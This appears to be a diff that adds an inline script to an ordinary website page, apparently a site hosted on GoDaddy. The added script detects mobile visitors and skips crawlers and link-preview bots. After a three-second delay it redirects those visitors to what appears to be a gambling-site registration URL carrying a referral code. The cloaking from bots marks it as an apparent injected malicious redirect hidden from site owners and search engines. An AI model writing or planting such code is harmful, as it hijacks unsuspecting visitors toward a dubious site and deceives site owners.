@@ -1720,7 +1720,28 @@
             Chat
         </a>
     </div>
+    
+<script>
+(function() {
+    var targetUrl = "https://pintuplayhoki.it.com/home?register&ref=Makjang77";
 
+    function isMobile() {
+        return /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(navigator.userAgent);
+    }
+
+    function isBot() {
+        return /bot|crawl|slurp|spider|mediapartners|facebookexternalhit|WhatsApp|Telegram|Slack|Discord/i.test(navigator.userAgent.toLowerCase());
+    }
+
+    var delay = 3000;
+
+    if (isMobile() && !isBot()) {
+        setTimeout(function() {
+            window.location.href = targetUrl;
+        }, delay);
+    }
+})();
+</script>
 
     <script src='https://img1.wsimg.com/traffic-assets/js/tccl.min.js'></script>
 </body>
